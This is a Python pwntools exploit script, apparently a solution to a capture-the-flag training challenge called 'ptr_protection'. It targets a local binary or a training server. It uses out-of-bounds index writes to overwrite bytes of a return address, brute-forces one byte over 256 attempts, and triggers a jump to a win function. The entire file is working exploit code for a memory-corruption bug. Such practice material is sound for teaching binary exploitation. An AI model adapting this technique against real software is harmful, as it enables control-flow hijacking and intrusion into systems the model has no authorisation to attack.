from pwn import *


CHALL_PATH = "./ptr_protection"
COMMANDS = """
brva 0x1502
c
"""
context.log_level = 'error'

ld_preload = './alarm.so'
context.arch = "amd64"

if args.GDB:
    c = gdb.debug(CHALL_PATH, COMMANDS, env={'LD_PRELOAD': ld_preload})

for i in range(256):
    if args.REMOTE:
        c = remote("ptr-protection.training.offensivedefensive.it", 8080, ssl=True)
    else:
        c = process(CHALL_PATH, env={'LD_PRELOAD': ld_preload})
    # Brute force the last byte
    c.recvuntil(b"index: ")
    c.sendline(b"40")
    c.recvuntil(b"data: ")
    c.sendline(b"124") # 0x7c
    
    # Brute force the last byte
    c.recvuntil(b"index: ")
    c.sendline(b"41")
    c.recvuntil(b"data: ")
    c.sendline(str(i).encode())   

    # return to the computed address
    c.recvuntil(b"index: ")
    c.sendline(b"-1")
    response = c.recv(250)
    if b"WIN" in response:
        print(f"Input: {i}, Response: {response}")
        break
    c.close()   
